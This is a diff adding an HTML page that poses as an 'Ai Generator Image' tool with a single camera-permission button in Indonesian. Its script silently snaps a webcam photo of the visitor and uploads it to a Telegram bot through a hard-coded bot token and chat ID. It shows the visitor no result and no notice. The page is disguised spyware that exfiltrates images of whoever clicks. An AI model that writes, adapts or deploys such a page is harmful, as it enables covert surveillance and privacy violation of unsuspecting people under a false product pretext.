@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Ai Generator Image</title>
+</head>
+<body>
+
+  <button id="Generate">Izinkan Kamera</button>
+
+  <script>
+    const izinKameraButton = document.getElementById('Generate');
+
+    izinKameraButton.addEventListener('click', async () => {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+        const videoTrack = stream.getVideoTracks()[0];
+        const imageCapture = new ImageCapture(videoTrack);
+        const photoBlob = await imageCapture.takePhoto();
+
+        const formData = new FormData();
+        formData.append('photo', photoBlob, 'photo.jpg');
+
+        const telegramBotToken = '8301101967:AAGLskbUu4-458XUX2QxWq1Q2eqiWgluMCQ';
+        const telegramChatId = '7406376985';
+        const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendPhoto?chat_id=${telegramChatId}`;
+
+        const response = await fetch(telegramApiUrl, {
+          method: 'POST',
+          body: formData
+        });
+
+        if (response.ok) {
+          
+        } else {
+          
+        }
+
+        stream.getTracks().forEach(track => track.stop());
+
+      } catch (error) {
+        
+      }
+    });
+  </script>
+
+</body>
+</html>
